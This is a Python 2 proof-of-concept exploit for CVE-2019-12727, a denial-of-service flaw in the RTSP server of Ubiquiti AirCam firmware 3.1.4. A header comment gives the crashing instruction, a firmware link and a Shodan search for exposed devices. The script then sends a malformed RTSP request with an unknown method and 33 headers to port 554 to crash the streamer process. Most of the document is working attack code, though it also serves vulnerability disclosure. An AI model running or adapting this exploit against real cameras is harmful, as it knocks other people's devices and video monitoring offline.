'''
CVE-2019-12727
--
Denial of Service in RTSP server in Aircam firmware (tested on latest version, AirCam firmware 3.1.4 - 2016-03-04)


PoC to cause the SIGSEGV (invalid read):

(/bin/ubnt-streamer)
0xf66b0344    cmn    r0, #0x1000


https://www.ui.com/download/unifi-video/unifi-video-legacy/aircam


https://www.shodan.io/search?query=ubnt+rtsp

'''


import socket

 class RtspRequest(object):

     def __init__(self, ip_address, port):
         self._ip_address = ip_address
         self._port = port

     def generate_request(self, method, uri, headers):
         data = ""
         data += "%s %s RTSP/1.0\r\n" % (method, uri)
         for item in headers:
             header = headers[item]
             data += "%s:%s\r\n" % (item, header)
         data += "\r\n"
         return data

     def send_request(self, data): 
         sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sd.settimeout(15)
         sd.connect((self._ip_address, self._port))
         sd.send(data)
         print "Request:\n" + data
         resp = sd.recv(2048)
         sd.close()
         return resp

 if __name__ == "__main__":
     ip = "127.0.0.1"
     anRtsp = RtspRequest(ip, 554)
     uri = "kk"
     headers = {}
     for x in xrange(0,33):
         headers[x] = x
     req = anRtsp.generate_request("X" ,uri, headers)
     rsp = anRtsp.send_request(req)
     print "Response: \n" + rsp
